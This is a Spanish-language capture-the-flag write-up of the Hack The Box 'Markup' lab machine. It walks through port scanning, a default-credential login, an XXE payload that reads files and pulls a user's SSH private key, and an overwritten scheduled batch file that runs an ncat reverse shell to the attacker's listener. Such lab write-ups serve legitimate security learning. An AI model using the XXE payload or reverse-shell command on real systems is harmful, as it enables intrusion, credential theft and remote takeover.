---
title: Markup
layout: page
permalink: /HTB_Markup
---

<h2 class="amarillo">Markup</h2>
<div id="imgs" style="text-align: center;">
  <img src="/assets/images/StartingPoint/VIP/Markup/markup.webp" alt="under" oncontextmenu="return false;">
</div>


Encendemos la máquina y una vez verificados con ping lanzaremos un escaneo rápido y sigiloso con nmap para identificar los puertos abiertos:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.95.192 -oG allPorts
```

![[HTB/Starting Point VIP/Tier 3/Markup/Images/nmap.png]]

Utilizando la utilidad de extractPorts como siempre copiaremos los puertos abiertos de la captura y haremos un escano exhaustivo para identificar la version y servicio que corren para estos puertos:
![[HTB/Starting Point VIP/Tier 3/Markup/Images/extractPorts.png]]

Miramos los resultados del escaneo:
![[HTB/Starting Point VIP/Tier 3/Markup/Images/nmap2.png]]

# Explotación

Vemos un servicio web, podemos probar a enumerarlo con whatweb para ver un poquito a que nos estamos enfrentando:

![[HTB/Starting Point VIP/Tier 3/Markup/Images/whatweb.png]]

Vemos un apache y un ssl, recordar importante que ssl es un puerto para HTTPS entonces también podemos atentar contra este puerto con whatweb:
![[HTB/Starting Point VIP/Tier 3/Markup/Images/whatweb2.png]]

Sin muchos resultados abrimos la web y nos encontramos un panel de login:
![[HTB/Starting Point VIP/Tier 3/Markup/Images/web.png]]

Pudimos burlar este panel con admin:password como credenciales por defecto.
![[HTB/Starting Point VIP/Tier 3/Markup/Images/web2.png]]

Vemos que la página tiene una parte curiosa y llama mucho la atención:

![[xml.png]]

Probamos a colocar datos y interceptar la petición con Caido:
![[HTB/Starting Point VIP/Tier 3/Markup/Images/caido.png]]

Y vemos que se está tramitando un estructura en XML, y como estamos frente a un Windows podemos tratar de listar contenido del hosts:
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/system32/drivers/etc/hosts'>]>
<order>
<quantity>
3
</quantity>
<item>
&test;
</item>
<address>
17th Estate, CA
</address>
</order>
```

![[HTB/Starting Point VIP/Tier 3/Markup/Images/caido2.png]]

Y efectivamente, por tanto tenemos un XXE XML EXternal Entity, podemos intentar otra cosa como ir listando el directorio del usuario y vemos que podemos acceder al directorio de daniel y a su carpeta .ssh:
![[HTB/Starting Point VIP/Tier 3/Markup/Images/caido3.png]]

Una vez tenemos esta llave rsa podemos conectarnos por SSH:
![[HTB/Starting Point VIP/Tier 3/Markup/Images/user.png]]

Y habremos completado la intrusión:

# Escalada

Al igual que las máquinas Linux con `sudo -l` en Windows podemos hacer `whoami /priv`

![[HTB/Starting Point VIP/Tier 3/Markup/Images/escalada.png]]

Podemos acceder a directorios privilegiados y encontramos dentro de C:\ un directorio inusual llamado Log-Management
![[HTB/Starting Point VIP/Tier 3/Markup/Images/escalada2.png]]

Vemos que podemos ejecutar job.bat como Administrator y usando icacls podemos confirmarlo
![[HTB/Starting Point VIP/Tier 3/Markup/Images/escalada3.png]]

La idea será subir el ncat para windows y entablar una reverse shell abusando del binario.bat
![[HTB/Starting Point VIP/Tier 3/Markup/Images/escalada4.png]]
Estando en escucha por el puerto 443 ejecutamos `echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.16.12 443 > C:\Log-Management\job.bat`

![[HTB/Starting Point VIP/Tier 3/Markup/Images/metidos.png]]

Voila! obtenemos la shell como Administrator.

![[HTB/Starting Point VIP/Tier 3/Markup/Images/pwn.png]]

